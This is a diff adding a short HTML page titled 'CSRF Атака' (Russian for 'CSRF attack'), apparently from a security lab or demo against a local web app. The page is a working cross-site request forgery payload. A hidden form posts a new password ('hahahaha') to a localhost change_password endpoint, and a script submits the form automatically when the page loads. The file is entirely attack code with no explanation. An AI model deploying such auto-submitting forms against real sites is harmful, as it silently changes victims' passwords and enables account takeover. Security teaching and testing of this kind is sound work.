@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Атака</title>
+</head>
+<body>
+    <form method="POST" action="http://localhost:5000/change_password" id="csrf-form">
+        <input type="hidden" name="new_password" value="hahahaha"> 
+    </form>
+    <script>
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+</html>
